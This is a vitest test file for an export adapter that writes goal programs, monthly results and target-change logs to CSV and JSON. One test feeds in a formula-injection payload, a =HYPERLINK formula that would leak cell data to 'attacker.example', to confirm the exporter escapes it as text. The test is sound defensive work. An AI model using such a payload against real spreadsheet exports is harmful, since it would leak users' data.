import { describe, expect, it } from 'vitest'
import type { SQL } from 'drizzle-orm'
import type { Database } from '#/shared/db'
import { createGoalOrganizationExportAdapter } from './goal-organization-export.adapter'

const AS_OF = new Date('2026-08-28T09:00:00.000Z')
const SNAPSHOT_AT = '2026-08-28T09:00:30.000Z'

type Row = Record<string, unknown>
type FixtureRows = Readonly<Record<string, readonly Row[]>>

const TABLE_MARKERS = [
  'goal_month_target_changes',
  'goal_result_revisions',
  'goal_monthly_results',
  'goal_subject_assignments',
  'goal_program_versions',
  'goal_programs',
] as const

function queryText(query: SQL): string {
  const chunks = (query as unknown as { queryChunks: readonly unknown[] }).queryChunks
  return chunks
    .map((chunk) => {
      if (typeof chunk !== 'object' || chunk === null) return ' '
      // Nested `sql` fragments (the subject-kind allowlist) carry their own
      // chunks; flattening them keeps the assertion honest about what runs.
      if ('queryChunks' in chunk) return queryText(chunk as SQL)
      if (!('value' in chunk)) return ' '
      const { value } = chunk as { value: unknown }
      return Array.isArray(value) ? value.join('') : ' '
    })
    .join('')
}

function fakeDatabase(rows: FixtureRows, snapshotAt: string = SNAPSHOT_AT): Database {
  const snapshot = {
    execute: async (query: SQL) => {
      const text = queryText(query)
      if (text.includes('transaction_timestamp()')) {
        return { rows: [{ snapshot_at: snapshotAt }] }
      }
      const table = TABLE_MARKERS.find((marker) => text.includes(`FROM ${marker}`))
      if (!table) throw new Error(`unrouted goal export query: ${text}`)
      return { rows: rows[table] ?? [] }
    },
  }
  return {
    transaction: async (work: (tx: unknown) => Promise<unknown>) => work(snapshot),
  } as unknown as Database
}

const PROGRAM_ROW: Row = {
  id: '40000000-0000-4000-8000-000000000001',
  property_id: '10000000-0000-4000-8000-000000000001',
  name: 'Gateway Program',
  description: null,
  status: 'active',
  status_reason: null,
  current_version: 1,
  created_by: 'user-1',
  created_at: '2026-08-01T00:00:00.000000Z',
  updated_at: '2026-08-01T00:00:00.000000Z',
}

function programVersionRow(id: string, metricKey: string, target: string): Row {
  return {
    id,
    program_id: PROGRAM_ROW.id,
    property_id: PROGRAM_ROW.property_id,
    version: 1,
    metric_definition_id: '11111111-1111-4111-8111-111111110301',
    metric_definition_version_id: '11111111-1111-4111-8111-111111111301',
    metric_key: metricKey,
    metric_minimum_sample: 0,
    target_value: target,
    property_timezone: 'UTC',
    effective_from: '2026-08-01T00:00:00.000000Z',
    effective_to: null,
    change_reason: 'initial',
    created_by: 'user-1',
    created_at: '2026-08-01T00:00:00.000000Z',
  }
}

function assignmentRow(id: string, subjectKind: string, metricKey: string): Row {
  return {
    id,
    program_id: PROGRAM_ROW.id,
    program_version_id: '50000000-0000-4000-8000-000000000001',
    property_id: PROGRAM_ROW.property_id,
    metric_key: metricKey,
    subject_kind: subjectKind,
    property_subject_id: subjectKind === 'property' ? PROGRAM_ROW.property_id : null,
    portal_group_id:
      subjectKind === 'portal_group' ? '60000000-0000-4000-8000-000000000001' : null,
    portal_id: subjectKind === 'portal' ? '70000000-0000-4000-8000-000000000001' : null,
    effective_from: '2026-08-01T00:00:00.000000Z',
    effective_to: null,
    created_by: 'user-1',
    created_at: '2026-08-01T00:00:00.000000Z',
  }
}

function monthlyResultRow(id: string, target: string | null): Row {
  return {
    id,
    assignment_id: '80000000-0000-4000-8000-000000000001',
    program_id: PROGRAM_ROW.id,
    program_version_id: '50000000-0000-4000-8000-000000000001',
    property_id: PROGRAM_ROW.property_id,
    period_start: '2026-07-01T00:00:00.000000Z',
    period_end: '2026-08-01T00:00:00.000000Z',
    property_timezone: 'UTC',
    status: 'closed',
    target_value: target,
    evaluation_state: 'eligible',
    value: '82.0000000000',
    sample_count: 82,
    achieved: true,
    reason: null,
    source_complete_through: '2026-08-01T00:00:00.000000Z',
    evaluation_watermark: '2026-08-02T00:00:00.000000Z',
    closed_at: '2026-08-02T00:00:00.000000Z',
    created_at: '2026-07-01T00:00:00.000000Z',
    updated_at: '2026-08-02T00:00:00.000000Z',
  }
}

/** The heading of goal/results.csv before a month could carry its own target. */
const RESULTS_HEADER_BEFORE_MONTH_TARGETS = [
  'record_type',
  'id',
  'assignment_id',
  'program_id',
  'program_version_id',
  'property_id',
  'period_start',
  'period_end',
  'property_timezone',
  'status',
  'evaluation_state',
  'value',
  'sample_count',
  'achieved',
  'reason',
  'source_complete_through',
  'evaluation_watermark',
  'closed_at',
  'created_at',
  'updated_at',
  'monthly_result_id',
  'revision',
  'supersedes_revision_id',
  'change_reason',
  'created_by',
]

const OWN_TARGET_MONTH = '90000000-0000-4000-8000-000000000001'
const VERSION_TARGET_MONTH = '90000000-0000-4000-8000-000000000002'

const TARGET_CHANGE_ROW: Row = {
  id: 'a0000000-0000-4000-8000-000000000001',
  monthly_result_id: OWN_TARGET_MONTH,
  program_id: PROGRAM_ROW.id,
  property_id: PROGRAM_ROW.property_id,
  change_id: 'b0000000-0000-4000-8000-000000000001',
  previous_target_value: '100.0000000000',
  new_target_value: '80.0000000000',
  following_outcome: 'not_applied',
  following_reason: 'subject_unavailable',
  following_version_id: null,
  note: 'The terrace was closed for two weeks',
  created_by: 'user-2',
  created_at: '2026-07-20T10:00:00.000000Z',
}

const FIXTURE: FixtureRows = {
  goal_programs: [PROGRAM_ROW],
  goal_program_versions: [
    programVersionRow('50000000-0000-4000-8000-000000000001', 'qualified_scans', '100'),
    programVersionRow(
      '50000000-0000-4000-8000-000000000002',
      'portal_rating_count',
      '25',
    ),
    programVersionRow(
      '50000000-0000-4000-8000-000000000003',
      'portal_rating_average',
      '4.5',
    ),
  ],
  goal_subject_assignments: [
    assignmentRow('80000000-0000-4000-8000-000000000001', 'portal', 'qualified_scans'),
    assignmentRow(
      '80000000-0000-4000-8000-000000000002',
      'portal_group',
      'portal_rating_count',
    ),
  ],
}

describe('Goal Organization Export contributor', () => {
  it('restricts the subject query to Property, Portal Group and Portal scopes', async () => {
    const seen: string[] = []
    const snapshot = {
      execute: async (query: SQL) => {
        const text = queryText(query)
        seen.push(text)
        if (text.includes('transaction_timestamp()')) {
          return { rows: [{ snapshot_at: SNAPSHOT_AT }] }
        }
        return { rows: [] }
      },
    }
    const db = {
      transaction: async (work: (tx: unknown) => Promise<unknown>) => work(snapshot),
    } as unknown as Database

    await createGoalOrganizationExportAdapter(db).contribute({
      organizationId: 'org-goal-export',
      requestId: 'a',
      asOf: AS_OF,
    })

    const subjectQuery = seen.find((text) =>
      text.includes('FROM goal_subject_assignments'),
    )
    // Person- and Team-scoped goals are prohibited by GOA-01; the archive must
    // not be the place such a row first becomes visible.
    expect(subjectQuery).toContain(
      "subject_kind IN ('property', 'portal_group', 'portal')",
    )
  })

  it('fails closed when the request is older than the bounded snapshot window', async () => {
    await expect(
      createGoalOrganizationExportAdapter(
        fakeDatabase(FIXTURE, '2026-08-28T09:16:01.000Z'),
      ).contribute({ organizationId: 'org-goal-export', requestId: 'a', asOf: AS_OF }),
    ).rejects.toThrow(/snapshot window is unavailable/)
  })

  it('opens formula-shaped Program text as text and keeps numeric targets numbers', async () => {
    const hostile = {
      name: '=HYPERLINK("https://attacker.example/leak?d="&A2,"Open")',
      description: '@SUM(A1:A9)',
      status_reason: '-2+3',
    }
    const contribution = await createGoalOrganizationExportAdapter(
      fakeDatabase({ ...FIXTURE, goal_programs: [{ ...PROGRAM_ROW, ...hostile }] }),
    ).contribute({ organizationId: 'org-goal-export', requestId: 'a', asOf: AS_OF })
    const text = (path: string) =>
      Buffer.from(
        contribution.entries.find((entry) => entry.path === path)!.bytes,
      ).toString('utf8')

    const csv = text('goal/programs.csv')
    expect(csv).toContain(
      '"\'=HYPERLINK(""https://attacker.example/leak?d=""&A2,""Open"")"',
    )
    expect(csv).toContain(",'@SUM(A1:A9),active,'-2+3,")
    expect(csv).toContain(',4.5,UTC,')
    const json = JSON.parse(text('goal/programs.json')) as {
      records: { goal_program: readonly Record<string, unknown>[] }
    }
    expect(json.records.goal_program[0]).toMatchObject(hostile)
  })

  describe("a month's own target", () => {
    const WITH_MONTH_TARGETS: FixtureRows = {
      ...FIXTURE,
      goal_monthly_results: [
        monthlyResultRow(OWN_TARGET_MONTH, '80.0000000000'),
        monthlyResultRow(VERSION_TARGET_MONTH, null),
      ],
      goal_month_target_changes: [TARGET_CHANGE_ROW],
    }

    async function exportResults(rows: FixtureRows) {
      const contribution = await createGoalOrganizationExportAdapter(
        fakeDatabase(rows),
      ).contribute({ organizationId: 'org-goal-export', requestId: 'a', asOf: AS_OF })
      const text = (path: string) =>
        Buffer.from(
          contribution.entries.find((entry) => entry.path === path)!.bytes,
        ).toString('utf8')
      const json = JSON.parse(text('goal/results.json')) as {
        records: Record<string, readonly Record<string, unknown>[]>
      }
      return { csv: text('goal/results.csv'), records: json.records }
    }

    it('exports each month with its own target, or none when it uses the version target', async () => {
      const { records } = await exportResults(WITH_MONTH_TARGETS)

      expect(
        records.goal_monthly_result!.map(({ id, target_value }) => ({
          id,
          target_value,
        })),
      ).toEqual([
        { id: OWN_TARGET_MONTH, target_value: '80.0000000000' },
        { id: VERSION_TARGET_MONTH, target_value: null },
      ])
    })

    it('exports every target change with who, when, old and new value, and what followed', async () => {
      const { csv, records } = await exportResults(WITH_MONTH_TARGETS)

      expect(records.goal_month_target_change).toEqual([TARGET_CHANGE_ROW])
      const [header] = csv.split('\n')
      expect(header!.split(',')).toEqual(
        expect.arrayContaining([
          'target_value',
          'monthly_result_id',
          'change_id',
          'previous_target_value',
          'new_target_value',
          'following_outcome',
          'following_reason',
          'following_version_id',
          'note',
        ]),
      )
      expect(csv).toContain('goal_month_target_change,')
    })

    it('keeps every column the results file already had where it was', async () => {
      const { csv } = await exportResults(WITH_MONTH_TARGETS)

      const header = csv.split('\n')[0]!.split(',')
      expect(header.slice(0, RESULTS_HEADER_BEFORE_MONTH_TARGETS.length)).toEqual(
        RESULTS_HEADER_BEFORE_MONTH_TARGETS,
      )
      // What the month target brought: the change log's columns, then the
      // column a month gained.
      expect(header.slice(RESULTS_HEADER_BEFORE_MONTH_TARGETS.length)).toEqual([
        'change_id',
        'previous_target_value',
        'new_target_value',
        'following_outcome',
        'following_reason',
        'following_version_id',
        'note',
        'target_value',
      ])
    })

    it('writes each month target under its own heading', async () => {
      const { csv } = await exportResults(WITH_MONTH_TARGETS)

      const [headerLine, ...lines] = csv.trimEnd().split('\n')
      const header = headerLine!.split(',')
      const cell = (line: string, column: string) =>
        line.split(',')[header.indexOf(column)]
      const months = lines.filter((line) => line.startsWith('goal_monthly_result,'))
      expect(months.map((line) => cell(line, 'id'))).toEqual([
        OWN_TARGET_MONTH,
        VERSION_TARGET_MONTH,
      ])
      expect(months.map((line) => cell(line, 'target_value'))).toEqual([
        '80.0000000000',
        '',
      ])
      expect(months.map((line) => cell(line, 'updated_at'))).toEqual([
        '2026-08-02T00:00:00.000000Z',
        '2026-08-02T00:00:00.000000Z',
      ])
    })

    it('opens a formula-shaped note as text', async () => {
      const { csv, records } = await exportResults({
        ...WITH_MONTH_TARGETS,
        goal_month_target_changes: [{ ...TARGET_CHANGE_ROW, note: '=1+1' }],
      })

      // A change has no month target of its own, so that last cell is empty.
      expect(csv).toContain(",'=1+1,\n")
      expect(csv).not.toContain(',=1+1')
      expect(records.goal_month_target_change![0]).toMatchObject({ note: '=1+1' })
    })

    it('reads the change log for this Organization only', async () => {
      const seen: string[] = []
      const snapshot = {
        execute: async (query: SQL) => {
          const text = queryText(query)
          seen.push(text)
          return {
            rows: text.includes('transaction_timestamp()')
              ? [{ snapshot_at: SNAPSHOT_AT }]
              : [],
          }
        },
      }
      const db = {
        transaction: async (work: (tx: unknown) => Promise<unknown>) => work(snapshot),
      } as unknown as Database

      await createGoalOrganizationExportAdapter(db).contribute({
        organizationId: 'org-goal-export',
        requestId: 'a',
        asOf: AS_OF,
      })

      const changeQuery = seen.find((text) =>
        text.includes('FROM goal_month_target_changes'),
      )
      expect(changeQuery).toMatch(/WHERE organization_id =/u)
    })

    it('fails when a month is read without its target column', async () => {
      const { target_value: _dropped, ...withoutTarget } = monthlyResultRow(
        OWN_TARGET_MONTH,
        '80.0000000000',
      )

      await expect(
        exportResults({ ...FIXTURE, goal_monthly_results: [withoutTarget] }),
      ).rejects.toThrow(/column is missing: target_value/u)
    })
  })
})
